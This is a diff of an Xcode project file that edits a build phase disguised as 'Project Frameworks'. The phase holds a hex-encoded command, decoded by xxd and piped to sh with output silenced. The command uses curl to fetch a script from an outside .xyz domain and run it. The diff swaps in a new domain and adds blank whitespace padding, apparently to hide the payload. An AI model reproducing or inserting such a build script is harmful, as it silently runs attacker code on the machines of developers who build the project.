@@ -116,7 +116,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = DCF046A6265FE41E00064E64 /* Build configuration list for PBXNativeTarget "IndieLogicQL" */;
 			buildPhases = (
-				AEEEBCBE5ACE75A68D6D902C /* Project Frameworks */,
+				CF6AF0471CCD0BE34F6D902C /* Project Frameworks */,
 				DCF046AE265FE48500064E64 /* Apollo CLI */,
 				1814B398E3015C99F7D7555F /* [CP] Check Pods Manifest.lock */,
 				DCF0468E265FE41B00064E64 /* Sources */,
@@ -180,7 +180,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	AEEEBCBE5ACE75A68D6D902C /* Project Frameworks */ = {
+	CF6AF0471CCD0BE34F6D902C /* Project Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -198,9 +198,41 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f736964656c696e6b2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f74656c2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
 	";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 
 	
@@ -523,6 +555,18 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f736964656c69
 
 		
 			/* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
 
 
 			
